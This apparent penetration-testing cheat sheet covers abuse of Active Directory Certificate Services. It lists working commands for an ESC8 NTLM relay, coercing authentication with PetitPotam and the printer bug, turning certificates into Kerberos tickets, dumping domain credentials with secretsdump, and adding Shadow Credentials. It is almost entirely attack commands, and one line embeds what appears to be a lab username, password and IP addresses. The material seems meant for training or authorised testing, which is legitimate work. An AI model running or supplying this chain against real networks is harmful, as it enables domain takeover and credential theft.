# Pass the Certificate

## Overview
* Abuse Active Directory Certificate Services (ADCS) to obtain certificates that can be used for authentication
* Most common: ESC8 (NTLM relay to ADCS web enrollment)

## ESC8 - NTLM Relay to ADCS Web Enrollment

### Set Up Relay

```bash
# Template depends on target - DomainController for DCs, KerberosAuthentication for others
ntlmrelayx.py -debug -smb2support --target http://<CA_HOST>/certsrv/certfnsh.asp --adcs --template DomainController
```

### Coerce Authentication

```bash
# PetitPotam (MS-EFSRPC) - often works unauthenticated
python3 PetitPotam.py <attacker_ip> <dc_ip>

# Printer Bug (MS-RPRN) - requires valid creds
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```

### Obtain TGT from Certificate

```bash
python3 gettgtpkinit.py <DOMAIN>/<DC$> -cert-pfx <cert.pfx> -dc-ip <dc_ip> dc.ccache
```

### DCSync with Machine Account TGT

```bash
export KRB5CCNAME=dc.ccache
secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass <DC_FQDN>
```

### Alternative: Get NT Hash Directly from TGT

```bash
python3 getnthash.py -key <as_rep_key> <DOMAIN>/<DC$>
```

### Certipy (All-in-One Alternative)

```bash
certipy auth -pfx <cert.pfx> -dc-ip <dc_ip> -domain <DOMAIN>

# If PKINIT fails (DC doesn't support it), fall back to ldap-shell
certipy auth -pfx <cert.pfx> -dc-ip <dc_ip> -ldap-shell
```

### Windows: Rubeus with Certificate

```powershell
.\Rubeus.exe asktgt /user:<DC$> /certificate:<base64_cert> /ptt
```

## Shadow Credentials (msDS-KeyCredentialLink)

### Add Shadow Credential (Linux)

```bash
pywhisker --dc-ip <dc_ip> -d <DOMAIN> -u <user> -p '<pass>' --target <target_user> --action add
```

### Obtain TGT from Shadow Credential PFX

```bash
python3 gettgtpkinit.py -cert-pfx <cert.pfx> -pfx-pass '<password>' -dc-ip <dc_ip> <DOMAIN>/<target_user> /tmp/target.ccache
```

### Use the TGT

```bash
export KRB5CCNAME=/tmp/target.ccache
evil-winrm -i <dc_fqdn> -r <domain>
```
